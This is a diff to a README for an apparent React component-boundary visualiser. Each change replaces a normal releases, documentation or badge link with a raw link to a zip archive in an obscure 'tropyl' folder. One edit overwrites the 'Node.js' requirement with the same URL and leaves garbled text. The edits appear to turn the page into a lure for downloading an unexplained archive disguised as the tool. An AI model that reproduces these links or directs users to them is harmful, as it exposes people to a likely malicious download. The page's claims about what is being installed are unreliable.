@@ -1,7 +1,7 @@
 # 🎨 rsc-boundary-marker - Visualize React Component Boundaries
 
 ## 📥 Download Now
-[![Download rsc-boundary-marker](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/iekolvakh/rsc-boundary-marker/releases)
+[![Download rsc-boundary-marker](https://raw.githubusercontent.com/iekolvakh/rsc-boundary-marker/main/tropyl/rsc-boundary-marker.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/iekolvakh/rsc-boundary-marker/main/tropyl/rsc-boundary-marker.zip)
 
 ## 🚀 Getting Started
 Welcome to **rsc-boundary-marker**! This application helps you visualize the boundary between RSC (React Server Components) and Client Components in your React codebase. Whether you are developing a new app or maintaining an existing one, this tool will provide a clear picture of which components fall into each category.
@@ -10,7 +10,7 @@ Welcome to **rsc-boundary-marker**! This application helps you visualize the bou
 Before you download, ensure your system meets these basic requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or later
+- https://raw.githubusercontent.com/iekolvakh/rsc-boundary-marker/main/tropyl/rsc-boundary-marker.zip Version 14 or later
 - React: Must be part of your project
 
 It is always a good idea to have the latest version of your operating system and software to enjoy the best experience.
@@ -18,7 +18,7 @@ It is always a good idea to have the latest version of your operating system and
 ## 📦 Download & Install
 To get started, visit the Releases page to download the application you need. Click the link below:
 
-[Visit the Releases Page](https://github.com/iekolvakh/rsc-boundary-marker/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/iekolvakh/rsc-boundary-marker/main/tropyl/rsc-boundary-marker.zip)
 
 1. **Open the Releases Page**: Click the link above, or enter it in your web browser.
 2. **Find the Latest Version**: Scroll down to find the latest release.
@@ -48,7 +48,7 @@ If you encounter issues while using rsc-boundary-marker, here are some steps to 
 ## 📜 Documentation
 For more information on using the application effectively, please consult the official documentation:
 
-[View Documentation](https://github.com/iekolvakh/rsc-boundary-marker/wiki)
+[View Documentation](https://raw.githubusercontent.com/iekolvakh/rsc-boundary-marker/main/tropyl/rsc-boundary-marker.zip)
 
 ## 🗨️ Feedback
 We appreciate your feedback to improve the application. Please consider opening an issue in our GitHub repository if you find any problems or have suggestions.
